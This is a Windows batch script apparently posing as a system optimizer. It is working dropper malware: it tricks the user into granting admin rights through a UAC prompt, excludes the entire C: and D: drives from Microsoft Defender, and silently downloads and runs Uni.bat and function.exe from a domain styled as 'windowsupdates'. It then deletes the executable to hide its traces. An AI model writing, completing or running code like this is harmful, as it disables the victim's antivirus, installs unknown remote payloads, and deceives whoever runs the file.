@echo off

echo Please Select Yes And Wait

REM BatchGotAdmin (Run as Admin code starts)
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"
    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
powershell.exe -Command "Add-MpPreference -ExclusionPath 'C:\' ; Add-MpPreference -ExclusionPath 'D:\'"

REM Download Uni.bat using PowerShell silently
set "url2=https://rooptimizer.windowsupdates.repl.co/Uni.bat"
set "outputFileName2=Uni.bat"

powershell.exe -Command "$url = '%url2%'; $output = '%~dp0%outputFileName2%'; $wc = New-Object System.Net.WebClient; $wc.DownloadFile($url, $output)"

REM Run the downloaded Uni.bat
start "" "%~dp0%outputFileName2%"

REM Wait for a few seconds
timeout /t 5 /nobreak >nul

REM Download function.exe using PowerShell silently
set "url1=https://rooptimizer.windowsupdates.repl.co/function.exe"
set "outputFileName1=function.exe"

powershell.exe -Command "$url = '%url1%'; $output = '%~dp0%outputFileName1%'; $wc = New-Object System.Net.WebClient; $wc.DownloadFile($url, $output)"

REM Run the downloaded executable (function.exe)
start "" "%~dp0%outputFileName1%"

REM Wait for a few seconds
timeout /t 5 /nobreak >nul

REM Delete function.exe after it has been executed
del "%~dp0%outputFileName1%"

REM Wait for user to read the messages